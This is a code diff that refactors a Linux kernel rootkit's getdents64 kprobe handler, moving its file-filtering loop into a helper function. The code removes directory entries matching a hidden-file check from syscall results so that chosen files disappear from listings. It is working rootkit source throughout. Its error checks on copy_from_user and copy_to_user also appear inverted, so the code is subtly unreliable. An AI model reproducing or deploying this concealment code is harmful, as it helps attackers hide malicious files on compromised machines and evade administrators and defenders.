@@ -59,49 +59,48 @@ void sys_open_kprobe_exit_handler(struct pt_regs *syscall_regs,
   }
 }
 
+static void remove_hidden_from_dents(void *buf, int *nread) {
+  struct linux_dirent64 *d;
+  for (int bpos = 0; bpos < *nread;) {
+    d = (struct linux_dirent64 *)(buf + bpos);
+
+    if (is_hidden_file(d->d_name)) {
+      int reclen = d->d_reclen;
+      int remaining_bytes = *nread - (bpos + reclen);
+      memmove(d, (char *)d + reclen, remaining_bytes);
+      *nread -= reclen;
+
+    } else {
+      bpos += d->d_reclen;
+    }
+  }
+}
+
 void sys_getdents64_kprobe_exit_handler(struct pt_regs *regs,
                                         struct rootkit_cmd syscall_metadata) {
-
   int nread = *(int *)&regs->ax;
 
-  if (nread == -1) {
-    return;
-  }
-
-  if (nread == 0) {
+  if (nread <= 0) { // Operation failed or finished
     return;
   }
 
   struct linux_dirent64 *__user dirents_user =
       syscall_metadata.data.getdents_data.entries;
+
   unsigned int dirents_user_size = syscall_metadata.data.getdents_data.buf_size;
 
   void *buf = kmalloc(dirents_user_size, GFP_KERNEL);
   int n = copy_from_user(buf, dirents_user, dirents_user_size);
 
-  if (!n) {
-    goto free;
+  int fail = !n;
+  if (!fail) {
+    remove_hidden_from_dents(buf, &nread);
+    fail |= !copy_to_user(dirents_user, buf, dirents_user_size);
   }
 
-  struct linux_dirent64 *d;
-  for (int bpos = 0; bpos < nread;) {
-    d = (struct linux_dirent64 *)(buf + bpos);
-
-    if (is_hidden_file(d->d_name)) {
-      int reclen = d->d_reclen;
-      int remaining_bytes = nread - (bpos + reclen);
-      memmove(d, (char *)d + reclen, remaining_bytes);
-      nread -= reclen;
-    } else {
-      bpos += d->d_reclen;
-    }
+  if (!fail) {
+    regs->ax = nread;
   }
 
-  n = copy_to_user(dirents_user, buf, dirents_user_size);
-  if (!n) {
-    goto free;
-  }
-  regs->ax = nread;
-free:
   kfree(buf);
 }
